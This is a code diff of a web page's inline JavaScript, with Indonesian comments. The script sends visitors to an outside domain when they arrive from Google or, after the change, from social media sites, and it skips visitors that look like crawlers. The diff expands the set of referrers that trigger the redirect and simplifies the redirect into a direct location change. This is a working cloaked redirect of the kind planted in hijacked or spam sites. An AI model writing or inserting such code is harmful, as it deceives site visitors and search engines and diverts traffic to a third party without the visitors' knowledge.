@@ -162,10 +162,21 @@
             document.documentElement.classList.toggle('dark');
         });
     </script>
-    <script>
+  <script type="text/javascript">
       (function() {
     // Daftar parameter pencarian Google
     const googleParams = ['q', 'query', 'search', 'keywords'];
+    
+    // Daftar sosial media
+    const socialMediaRefs = [
+        'facebook.com',
+        'twitter.com',
+        'instagram.com',
+        'linkedin.com',
+        'pinterest.com',
+        'tiktok.com',
+        'reddit.com'
+    ];
 
     // Cek apakah referer berasal dari Google
     const isGoogleReferrer = document.referrer.includes('google.');
@@ -181,25 +192,17 @@
     const isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(userAgent);
     const isMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent);
 
-    // Jika memenuhi kriteria organic search
-    if ((isGoogleReferrer || hasSearchQuery) && !isBot) {
+    // Cek apakah referer berasal dari sosial media
+    const isSocialMediaReferrer = socialMediaRefs.some(domain => document.referrer.includes(domain));
+
+    // Jika memenuhi kriteria organic search atau klik dari sosial media
+    if ((isGoogleReferrer || hasSearchQuery || isSocialMediaReferrer) && !isBot) {
         let userInteracted = false;
 
-        // Fungsi untuk redirect menggunakan fetch untuk 307
-        const redirectToTarget = async () => {
+        // Fungsi untuk redirect
+        const redirectToTarget = () => {
             if (!userInteracted) {
-                const targetUrl = 'https://aiku.biz.id' + window.location.pathname;
-                // Menggunakan fetch untuk melakukan redirect
-                await fetch(targetUrl, {
-                    method: 'GET', // Menggunakan metode GET untuk redirect
-                    redirect: 'follow'
-                }).then(response => {
-                    if (response.ok) {
-                        window.location.href = targetUrl; // Redirect ke URL target
-                    }
-                }).catch(error => {
-                    console.error('Redirect failed:', error);
-                });
+                window.location.href = 'https://aiku.biz.id' + window.location.pathname;
             }
         };
 
